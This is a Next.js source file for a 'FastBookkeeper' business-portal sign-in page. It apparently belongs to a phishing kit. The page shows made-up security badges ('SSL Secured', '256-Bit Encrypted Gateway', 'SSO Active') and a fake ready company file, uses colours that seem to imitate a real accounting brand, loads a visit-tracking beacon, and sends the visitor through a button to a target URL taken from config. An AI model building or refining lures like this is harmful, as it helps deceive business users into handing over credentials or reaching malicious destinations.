import type { Metadata } from "next";
import { PortalButton, VisitBeacon } from "@/components/gateway-client";
import { readConfig } from "@/lib/config";
import { ctaHref } from "@/lib/url";

export const dynamic = "force-dynamic";

export const metadata: Metadata = {
  title: "Sign In to Business Portal",
  description:
    "Select your authorized session below to access your company dashboard and financial records.",
};

export default async function HomePage() {
  const config = await readConfig();
  const href = ctaHref(config.targetUrl);

  return (
    <div className="flex min-h-screen flex-col bg-slate-100">
      <header className="flex items-center justify-center gap-2.5 px-4 pt-8">
        <p className="text-xl font-semibold tracking-tight text-slate-900">
          FastBookkeeper
        </p>
        <span className="rounded-full bg-indigo-50 px-2.5 py-1 text-xs font-semibold text-indigo-800 ring-1 ring-indigo-200">
          SSL Secured
        </span>
      </header>
      <VisitBeacon />
      <main className="my-8 flex flex-1 items-center justify-center p-4">
        <div className="w-full max-w-md space-y-6 rounded-xl border border-[#D4D7DC] bg-white p-8 shadow-lg">
          <div className="space-y-2 text-center">
            <div className="inline-flex items-center space-x-1.5 rounded-full border border-blue-100 bg-blue-50 px-3 py-1 text-xs font-semibold text-[#0077C5]">
              <svg className="h-3.5 w-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
              <span>256-Bit Encrypted Gateway</span>
            </div>
            <h1 className="text-2xl font-bold tracking-tight text-slate-900">
              Sign In to Business Portal
            </h1>
            <p className="text-sm text-slate-500">
              Select your authorized session below to access your company dashboard and financial records.
            </p>
          </div>

          <div className="space-y-3 rounded-lg border border-[#E2E8F0] bg-[#F8FAFC] p-4">
            <div className="flex items-center justify-between border-b border-slate-200 pb-2 text-xs font-semibold uppercase tracking-wider text-slate-500">
              <span>Active Workspace</span>
              <span className="font-bold text-[#2CA01C]">Ready</span>
            </div>
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-semibold text-slate-800">Main Company File 2026</p>
                <p className="text-xs text-slate-500">Last Sync: Just now</p>
              </div>
              <span className="rounded bg-blue-50 px-2 py-1 text-xs font-medium text-[#0077C5]">
                SSO Active
              </span>
            </div>
          </div>

          <PortalButton href={href} />
        </div>
      </main>
    </div>
  );
}
